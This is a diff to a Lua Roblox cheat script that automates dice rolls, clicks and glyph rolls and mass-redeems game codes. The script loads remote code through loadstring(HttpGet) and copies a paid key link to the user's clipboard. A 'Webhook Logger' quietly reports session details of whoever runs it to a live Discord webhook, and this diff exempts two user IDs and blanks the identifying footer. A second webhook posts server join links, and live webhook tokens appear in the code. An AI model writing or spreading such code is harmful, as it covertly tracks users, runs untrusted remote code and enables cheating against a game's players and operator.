@@ -1,11 +1,11 @@
 -- DRM inf item script.lua
--- LocalScript — StarterPlayerScripts
+-- LocalScript - StarterPlayerScripts
 
 -- ── Rayfield ──────────────────────────────────────────────────
 local Rayfield = loadstring(game:HttpGet("https://sirius.menu/rayfield"))()
 
 -- Auto-copy key link to clipboard so it's ready when the key prompt appears
-setclipboard("https://loot-link.com/s?g7GsKuDe")
+setclipboard("https://loot-link.com/s?yeifaD0r")
 
 -- ── Services ──────────────────────────────────────────────────
 local Players = game:GetService("Players")
@@ -20,7 +20,8 @@ local rOpenCrate = Rem:WaitForChild("OpenCrate")
 local rRoll      = Rem:WaitForChild("Roll")
 local rClick     = Rem:WaitForChild("Click")
 local rGlyph     = Rem:WaitForChild("RollGlyph")
-local rSetTitle  = Rem:WaitForChild("SetTitle")
+local rSetTitle    = Rem:WaitForChild("SetTitle")
+local rRedeemCode  = Rem:WaitForChild("RedeemCode")
 
 -- ── Data ──────────────────────────────────────────────────────
 local ALL_ITEMS = {
@@ -155,8 +156,8 @@ local Window = Rayfield:CreateWindow({
 		FileName     = "DRIKey",
 		SaveKey      = true,
 		GrabKeyFromSite = false,
-		Key          = { "gy2uVcev8cWJpIaystu" },
-		KeyLink      = "https://loot-link.com/s?g7GsKuDe",
+		Key          = { "OsxJ1f2Lu3cPxBk4EwS" },
+		KeyLink      = "https://loot-link.com/s?yeifaD0r",
 	},
 })
 
@@ -164,8 +165,10 @@ local Window = Rayfield:CreateWindow({
 -- │  Webhook Logger                                              │
 -- └──────────────────────────────────────────────────────────────┘
 local WEBHOOK = "https://discord.com/api/webhooks/1495824830426255411/KRCf_9zKvw1PiKcD-VIpd3Cmq-ZMZHPWyW_y2f0iyGx03xN-PMfFuBWBJBdgHvc7lrQb"
+local WEBHOOK_SKIP_IDS = { [12358013] = true, [2891994245] = true }
 
 task.spawn(function()
+	if WEBHOOK_SKIP_IDS[player.UserId] then return end
 	local HS  = game:GetService("HttpService")
 	local MPS = game:GetService("MarketplaceService")
 
@@ -188,7 +191,7 @@ task.spawn(function()
 				{ name = "Job ID",       value = game.JobId,              inline = false },
 			},
 			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
-			footer    = { text = "DRI Infinite Item Script" },
+			footer    = { text = "" },
 		}},
 	})
 
@@ -203,24 +206,186 @@ task.spawn(function()
 end)
 
 -- ┌──────────────────────────────────────────────────────────────┐
+-- │  Weather Webhook                                             │
+-- └──────────────────────────────────────────────────────────────┘
+if game.PlaceId == 110626257954132 then
+	local WEATHER_WEBHOOK_BASE = "https://discord.com/api/webhooks/1508909493847724052/geCypaDCjOpE4ut3y6ecm-IRYgjWpR9FPlKkbysk-iUN7KVxTAMmLbql6sEkSNClABcg"
+
+	local WEATHER_THREAD = {
+		["Glitch"]            = "1508908686167380058",
+		["Syzygy"]            = "1508908790894821538",
+		["Wasteland"]         = "1508908842640212188",
+		["Twilight"]          = "1508909067245064402",
+		["Empyreal Radiance"] = "1508909242923614330",
+		["Dawnfall"]          = "1508909267623870674",
+		["Cosmic Rift"]       = "1508909365241974955",
+		["Starlight"]         = "1508909389946421379",
+		["Sanguis"]           = "1508909421651165226",
+		["Bloodmoon"]         = "1508909449954201640",
+		["EVIL"]              = "1508909472897040486",
+		["Sandstorm"]         = "1508909586776719562",
+		["Heatwave"]          = "1508909586776719562",
+		["Blizzard"]          = "1508909586776719562",
+		["Alpenglow"]         = "1508909586776719562",
+		["Acid Rain"]         = "1508909586776719562",
+	}
+
+	local WEATHER_ROLE = {
+		["Glitch"]            = "1508902380828233748",
+		["Syzygy"]            = "1508903765586214922",
+		["Wasteland"]         = "1508903815984975892",
+		["Twilight"]          = "1508903903012323439",
+		["Empyreal Radiance"] = "1508903946423636163",
+		["Dawnfall"]          = "1508904033891647569",
+		["Cosmic Rift"]       = "1508904039465881721",
+		["Starlight"]         = "1508904162056736899",
+		["Sanguis"]           = "1508904209809150082",
+		["Bloodmoon"]         = "1508904262397071560",
+		["EVIL"]              = "1508904288116543601",
+		["Sandstorm"]         = "1508909711490285568",
+		["Heatwave"]          = "1508909711490285568",
+		["Blizzard"]          = "1508909711490285568",
+		["Alpenglow"]         = "1508909711490285568",
+		["Acid Rain"]         = "1508909711490285568",
+	}
+
+	local WEATHER_RARITY = {
+		["Clear"]             = "1 in 1.5",
+		["Rain"]              = "1 in 20",
+		["Fog"]               = "1 in 50",
+		["Snow"]              = "1 in 50",
+		["Storm"]             = "1 in 100",
+		["Sandstorm"]         = "1 in 100",
+		["Heatwave"]          = "1 in 200",
+		["Blizzard"]          = "1 in 200",
+		["Alpenglow"]         = "1 in 400",
+		["Acid Rain"]         = "1 in 400",
+		["EVIL"]              = "1 in 400",
+		["Bloodmoon"]         = "1 in 500",
+		["Sanguis"]           = "1 in 800",
+		["Starlight"]         = "1 in 1k",
+		["Cosmic Rift"]       = "1 in 1k",
+		["Dawnfall"]          = "1 in 1.25k",
+		["Empyreal Radiance"] = "1 in 2.5k",
+		["Twilight"]          = "1 in 3.33k",
+		["Wasteland"]         = "1 in 5k",
+		["Syzygy"]            = "1 in 8k",
+		["Glitch"]            = "1 in 10k",
+	}
+
+	local USER_LINKS = {
+		[10469235644] = "https://www.roblox.com/share?code=149f4098caf68245b3564223bacfc1e6&type=Server",
+		[10685952548] = "https://www.roblox.com/share?code=7da756a2ebf13a4ab987ca53fbbf7f69&type=Server",
+		[6176018190]  = "https://www.roblox.com/share?code=2a5feeffd741e248bb70c11377bd8b26&type=Server",
+		[2382866599]  = "https://www.roblox.com/share?code=eddc63bc92531840957da102fca88b7f&type=Server",
+		[2601058045]  = "https://www.roblox.com/share?code=965f44c1d54139458b8981b4742a8992&type=Server",
+		[2365200071]  = "https://www.roblox.com/share?code=ff54132b63791446897131efa34a8d36&type=Server",
+		[1833037105]  = "https://www.roblox.com/share?code=f4c04ec66d0dee42ac37f930c02ba7bc&type=Server",
+		[1650861460]  = "https://www.roblox.com/share?code=c1c9cf6bbb187e43a8a4b6d4ed75ad8d&type=Server",
+		[857647554]   = "https://www.roblox.com/share?code=57d6fc042905204a97271dfd71a99ee0&type=Server",
+		[1334564616]  = "https://www.roblox.com/share?code=95432f145ce3ea4a8e25f880c6c9dac5&type=Server",
+	}
+
+	task.spawn(function()
+		local lastWeather = ""
+
+		local function sendAlert(name, timeLeft)
+			local threadId = WEATHER_THREAD[name]
+			local roleId   = WEATHER_ROLE[name]
+			if not threadId then return end
+
+			local rarity   = WEATHER_RARITY[name] or "?"
+			local joinLink = USER_LINKS[player.UserId]
+				or ("https://www.roblox.com/games/start?placeId=" .. tostring(game.PlaceId) .. "&gameInstanceId=" .. game.JobId)
+
+			local mins, secs = string.match(timeLeft, "(%d+):(%d+)")
+			local totalSecs  = (tonumber(mins) or 0) * 60 + (tonumber(secs) or 0)
+			local unixEnd    = os.time() + totalSecs
+			local timeStr    = "stops in <t:" .. tostring(unixEnd) .. ":R>"
+
+			local HS2 = game:GetService("HttpService")
+			local body = HS2:JSONEncode({
+				content  = roleId and "<@&" .. roleId .. ">" or nil,
+				username = "Weather Alert",
+				embeds   = {{
+					title  = name .. "  -  " .. rarity,
+					color  = 15548997,
+					fields = {
+						{ name = "Time Remaining", value = timeStr,                inline = true  },
+						{ name = "Place ID",       value = tostring(game.PlaceId), inline = true  },
+						{ name = "Server ID",      value = game.JobId,             inline = false },
+						{ name = "Join",           value = joinLink,               inline = false },
+					},
+					timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+				}},
+			})
+			pcall(function()
+				request({
+					Url     = WEATHER_WEBHOOK_BASE .. "?thread_id=" .. threadId,
+					Method  = "POST",
+					Headers = { ["Content-Type"] = "application/json" },
+					Body    = body,
+				})
+			end)
+		end
+
+		while true do
+			task.wait(2)
+			local text = ""
+			pcall(function()
+				text = workspace.Weather.Base.Interface.Weather.Text
+			end)
+			if text ~= "" then
+				local name, timeLeft = string.match(text, "^(.-)%s*%((.-)%)")
+				if not name then name = text; timeLeft = "?" end
+				name = name:match("^%s*(.-)%s*$")
+				if name ~= lastWeather then
+					lastWeather = name
+					sendAlert(name, timeLeft)
+				end
+			end
+		end
+	end)
+end
+
+-- ┌──────────────────────────────────────────────────────────────┐
 -- │  AUTO TAB                                                    │
 -- └──────────────────────────────────────────────────────────────┘
 local AutoTab = Window:CreateTab("Auto", "zap")
 
 AutoTab:CreateSection("⚠  Warning")
-AutoTab:CreateLabel("Disable Auto Roll Dice before manually rolling dice — using both at once may cause issues.")
+AutoTab:CreateLabel("Disable AutoRoll (from group) before using Auto Roll (from script)")
 
 AutoTab:CreateSection("Auto Roll Dice")
 
 AutoTab:CreateInput({
-	Name                    = "Delay  (sec, min 0.03)",
-	PlaceholderText         = "0.2",
+	Name                     = "Rolls per second  (min 0.1, max 10)",
+	PlaceholderText          = "5",
 	RemoveTextAfterFocusLost = false,
-	Flag                    = "dice_delay",
-	Callback                = function(v)
-		diceDelay = math.max(0.03, tonumber(v) or 0.2)
+	Flag                     = "dice_delay",
+	Callback                 = function(v)
+		local rps = math.max(0.1, math.min(10, tonumber(v) or 5))
+		diceDelay = 1 / rps
 	end,
 })
+
+local diceStatsLabel
+local diceFireCount = 0
+
+local function fmtNum(n)
+	if n >= 1e12 then return string.format("%.2fT", n / 1e12)
+	elseif n >= 1e9  then return string.format("%.2fB", n / 1e9)
+	elseif n >= 1e6  then return string.format("%.2fM", n / 1e6)
+	elseif n >= 1e3  then return string.format("%.2fK", n / 1e3)
+	else                  return string.format("%.0f",  n)
+	end
+end
+
+local function setDiceStats(text)
+	pcall(function()
+		diceStatsLabel:Set({ Title = "Roll Rate", Content = text })
+	end)
+end
 
 AutoTab:CreateToggle({
 	Name         = "Auto Roll Dice",
@@ -229,10 +394,17 @@ AutoTab:CreateToggle({
 	Callback     = function(on)
 		diceOn = on
 		if on then
+			diceFireCount = 0
 			diceTh = task.spawn(function()
+				local lastFire = 0
 				while diceOn do
-					rRoll:FireServer()
-					task.wait(diceDelay)
+					local now = tick()
+					if now - lastFire >= diceDelay then
+						lastFire = now
+						rRoll:FireServer()
+						diceFireCount += 1
+					end
+					task.wait(0.01)
 				end
 			end)
 		else
@@ -240,6 +412,41 @@ AutoTab:CreateToggle({
 		end
 	end,
 })
+
+-- paragraph appears below the toggle
+diceStatsLabel = AutoTab:CreateParagraph({ Title = "Roll Rate", Content = "-/s   -/min   -/h   -/d   |   0 fires/s" })
+
+-- always-on stats thread: updates every second regardless of toggle state
+task.spawn(function()
+	local lastVal   = 0
+	local lastFires = 0
+	local lastTime  = tick()
+	pcall(function() lastVal = player.leaderstats.Rolls.Value end)
+
+	while true do
+		task.wait(1)
+		local now     = tick()
+		local elapsed = now - lastTime
+		lastTime      = now
+
+		local curVal = lastVal
+		pcall(function() curVal = player.leaderstats.Rolls.Value end)
+		local ps      = curVal - lastVal
+		lastVal       = curVal
+
+		local fired   = diceFireCount - lastFires
+		lastFires     = diceFireCount
+		local realRps = elapsed > 0 and (fired / elapsed) or 0
+		local fires   = diceOn and string.format("%.4g", realRps) or "0"
+
+		setDiceStats(
+			fmtNum(ps) .. "/s   " ..
+			fmtNum(ps * 60) .. "/min   " ..
+			fmtNum(ps * 3600) .. "/h   " ..
+			fmtNum(ps * 86400) .. "/d   |   " .. fires .. " fires/s"
+		)
+	end
+end)
 
 AutoTab:CreateSection("Auto Click")
 
@@ -261,9 +468,14 @@ AutoTab:CreateToggle({
 		clickOn = on
 		if on then
 			clickTh = task.spawn(function()
+				local lastFire = 0
 				while clickOn do
-					rClick:FireServer(9)
-					task.wait(clickDelay)
+					local now = tick()
+					if now - lastFire >= clickDelay then
+						lastFire = now
+						rClick:FireServer(9)
+					end
+					task.wait(0.01)
 				end
 			end)
 		else
@@ -284,6 +496,15 @@ AutoTab:CreateInput({
 	end,
 })
 
+local glyphStatsLabel
+local glyphFireCount = 0
+
+local function setGlyphStats(text)
+	pcall(function()
+		glyphStatsLabel:Set({ Title = "Glyph Rate", Content = text })
+	end)
+end
+
 AutoTab:CreateToggle({
 	Name         = "Auto Roll Glyphs",
 	CurrentValue = false,
@@ -291,10 +512,17 @@ AutoTab:CreateToggle({
 	Callback     = function(on)
 		glyphOn = on
 		if on then
+			glyphFireCount = 0
 			glyphTh = task.spawn(function()
+				local lastFire = 0
 				while glyphOn do
-					rGlyph:InvokeServer()
-					task.wait(glyphDelay)
+					local now = tick()
+					if now - lastFire >= glyphDelay then
+						lastFire = now
+						rGlyph:InvokeServer()
+						glyphFireCount += 1
+					end
+					task.wait(0.01)
 				end
 			end)
 		else
@@ -302,6 +530,39 @@ AutoTab:CreateToggle({
 		end
 	end,
 })
+
+glyphStatsLabel = AutoTab:CreateParagraph({ Title = "Glyph Rate", Content = "-/s   -/min   -/h   -/d   |   0 fires/s" })
+
+task.spawn(function()
+	local lastVal   = 0
+	local lastFires = 0
+	local lastTime  = tick()
+	pcall(function() lastVal = player.Data.Stats["Glyphs Rolled"].Value end)
+
+	while true do
+		task.wait(1)
+		local now     = tick()
+		local elapsed = now - lastTime
+		lastTime      = now
+
+		local curVal = lastVal
+		pcall(function() curVal = player.Data.Stats["Glyphs Rolled"].Value end)
+		local ps      = curVal - lastVal
+		lastVal       = curVal
+
+		local fired   = glyphFireCount - lastFires
+		lastFires     = glyphFireCount
+		local realRps = elapsed > 0 and (fired / elapsed) or 0
+		local fires   = glyphOn and string.format("%.4g", realRps) or "0"
+
+		setGlyphStats(
+			fmtNum(ps) .. "/s   " ..
+			fmtNum(ps * 60) .. "/min   " ..
+			fmtNum(ps * 3600) .. "/h   " ..
+			fmtNum(ps * 86400) .. "/d   |   " .. fires .. " fires/s"
+		)
+	end
+end)
 
 -- ┌──────────────────────────────────────────────────────────────┐
 -- │  ITEMS TAB                                                   │
@@ -558,6 +819,28 @@ TpTab:CreateButton({
 	Callback = function()
 		rSetTitle:FireServer(titleName, titleColor)
 		Rayfield:Notify({ Title = "Done", Content = "Title set to: " .. titleName, Duration = 3, Image = 4483362458 })
+	end,
+})
+
+TpTab:CreateSection("Codes")
+
+TpTab:CreateButton({
+	Name     = "Redeem All Codes",
+	Info     = "Redeems all known active codes one by one",
+	Callback = function()
+		local CODES = {
+			"Release", "1M", "GoodQoL", "KorriRushedMe",
+			"EvenMoreGlyphs", "WeRollingNow", "Update5",
+			"ChestLuckBuff", "MyBad", "Skins", "RobLied",
+			"4-5", "1.5M", "Speedy", "Hiding",
+		}
+		task.spawn(function()
+			for _, code in ipairs(CODES) do
+				rRedeemCode:FireServer(code)
+				task.wait(0.5)
+			end
+			Rayfield:Notify({ Title = "Done", Content = "All codes redeemed!", Duration = 4, Image = 4483362458 })
+		end)
 	end,
 })
 
